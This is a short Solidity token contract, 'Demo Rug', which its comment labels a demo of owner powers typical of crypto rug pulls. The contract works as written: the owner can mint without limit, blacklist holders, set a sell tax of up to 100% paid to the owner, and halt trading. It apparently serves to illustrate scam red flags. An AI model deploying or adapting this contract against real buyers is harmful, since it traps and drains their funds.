// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @notice DEMO ONLY. Token with owner powers commonly seen in rug pulls:
/// unlimited mint, blacklist, adjustable sell tax up to 100%, and a trading switch.
contract RugToken {
    string public name = "Demo Rug";
    string public symbol = "DRUG";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    address public owner;
    address public pair;
    bool public tradingEnabled = true;
    uint256 public sellFeeBps = 300;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isBlacklisted;
    mapping(address => bool) public isExempt;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(uint256 supply) {
        owner = msg.sender;
        isExempt[msg.sender] = true;
        pair = address(uint160(uint256(keccak256("demo-pair"))));
        _mint(msg.sender, supply);
    }

    function mint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
    }

    function setBlacklist(address account, bool value) external onlyOwner {
        isBlacklisted[account] = value;
    }

    function setSellFee(uint256 bps) external onlyOwner {
        require(bps <= 10_000, "fee");
        sellFeeBps = bps;
    }

    function setTradingEnabled(bool value) external onlyOwner {
        tradingEnabled = value;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(!isBlacklisted[from] && !isBlacklisted[to], "blacklisted");
        if (!isExempt[from] && !isExempt[to]) require(tradingEnabled, "trading off");
        uint256 fee = (to == pair && !isExempt[from]) ? (amount * sellFeeBps) / 10_000 : 0;
        balanceOf[from] -= amount;
        balanceOf[to] += amount - fee;
        if (fee > 0) balanceOf[owner] += fee;
        emit Transfer(from, to, amount - fee);
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }
}
